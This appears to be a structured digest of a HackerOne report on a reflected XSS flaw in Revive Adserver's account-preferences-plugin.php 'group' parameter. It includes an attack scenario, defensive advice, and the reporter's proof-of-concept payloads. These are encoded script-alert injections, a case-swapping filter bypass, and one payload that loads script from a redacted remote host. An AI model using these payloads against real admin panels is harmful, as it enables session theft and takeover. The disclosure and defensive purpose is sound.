# Reflected XSS in account-preferences-plugin.php via group parameter

## Metadata
- **Source:** HackerOne
- **Report:** 3399191 | https://hackerone.com/reports/3399191
- **Submitted:** 2025-10-25
- **Reporter:** lu3ky-13
- **Program:** Revive Adserver
- **Bounty:** Not specified
- **Severity:** high
- **Vuln:** Reflected Cross-Site Scripting (XSS), Improper Output Encoding, Insufficient Input Validation
- **CVEs:** CVE-2025-48987
- **Category:** web-api

## Summary
A reflected XSS vulnerability exists in revive-adserver-6.0.1's account-preferences-plugin.php where the 'group' query parameter is reflected without proper output encoding or context-aware escaping. Attackers can inject arbitrary JavaScript that executes in the victim's browser context, enabling session hijacking, credential theft, or malware distribution.

## Attack scenario
1. Attacker crafts a malicious URL containing JavaScript payload in the 'group' parameter
2. Attacker tricks victim (admin) into clicking the crafted link via phishing email or social engineering
3. Victim visits the URL and the parameter value is reflected in the HTML response without sanitization
4. Browser parses and executes the injected script in the victim's authenticated session
5. Attacker's script steals session tokens, CSRF tokens, or performs admin actions on behalf of victim
6. Attacker gains unauthorized access to adserver configuration or user data

## Root cause
The application reflects user-supplied input from the 'group' query parameter directly into the HTML response without applying proper output encoding (HTML entity encoding) or context-aware escaping mechanisms.

## Attacker mindset
An attacker would target admin users of Revive Adserver instances, leveraging the admin panel access to compromise the adserver infrastructure, modify ad campaigns, redirect traffic, or harvest sensitive data. The reflected nature allows for easy URL distribution via phishing campaigns.

## Defensive takeaways
- Implement context-aware output encoding for all user inputs (HTML entity encoding for HTML context)
- Use templating engines with auto-escaping enabled by default
- Apply Content Security Policy (CSP) headers to mitigate XSS impact
- Perform input validation and whitelist acceptable values for 'group' parameter
- Implement HTTPOnly and Secure flags on session cookies
- Conduct security code review of all query parameter handling in admin interfaces
- Deploy Web Application Firewall (WAF) rules to detect XSS payloads

## Variant hunting
Check other query parameters in account-preferences-plugin.php and related admin pages
Search for similar unsafe reflection patterns in other .php files under www/admin/
Test POST parameters and cookie values in the same plugin
Look for DOM-based XSS variants where client-side JavaScript processes parameters
Check for stored XSS if user preferences are saved and reflected elsewhere
Test for blind XSS using out-of-band callbacks in hidden parameters

## MITRE ATT&CK
- T1190
- T1566.002
- T1547.003
- T1056.004
- T1005

## Notes
The researcher responsibly demonstrated non-destructive PoCs only and did not attempt secret exfiltration. The vulnerability affects admin interfaces, making it particularly dangerous as admins typically have elevated privileges. Multiple payload variations and encoding bypasses (case manipulation like ScRiPt, encoding tricks) suggest potential security bypasses in any implemented filters.

## Full report
<details><summary>Expand</summary>

h1 team 

I discovered a reflected cross-site scripting (RXSS) vulnerability in revive-adserver-6.0.1/www/admin/account-preferences-plugin.php via the group query parameter. Untrusted input is reflected without proper output encoding or context-aware escaping, allowing injection of JavaScript into the resulting page.

 Affected component(s)
===============================
revive-adserver-6.0.1/www/admin/account-preferences-plugin.php?group=
Tested instance: ████...


Proof of Concept (PoC)
Custom PoC URL (as tested / reported via xss.report): ```██████████%27%22%3E%3Cscript%20src=//███████%3E%3C/script%3E
```
Alternate (inline) PoC that demonstrates execution without remote resources:
```
██████████%27%22%3E%3Cscript%3Ealert(9645)%3C/script%3E
```

Example “normal payload” that produced a popup in my testing (non-destructive):

```
'"()%26%25<zzz><ScRiPt >alert(9645)</ScRiPt>

```
Steps to reproduce (safe)
```
████%27%22%3E%3Cscript%3Ealert(1)%3C/script%3E
```
Observe that the injected <script>alert(1)</script> is executed (popup appears) — confirming reflected XSS.

{F4931134}

## Impact

An attacker can inject script that executes in the victim’s browser context. This can be used for typical XSS abuse (UI redress, persistence of phishing content, session manipulation). Note: I only tested non-destructive PoCs and did not attempt to exfiltrate secrets.

</details>

---
*Analysed by Claude on 2026-05-12*
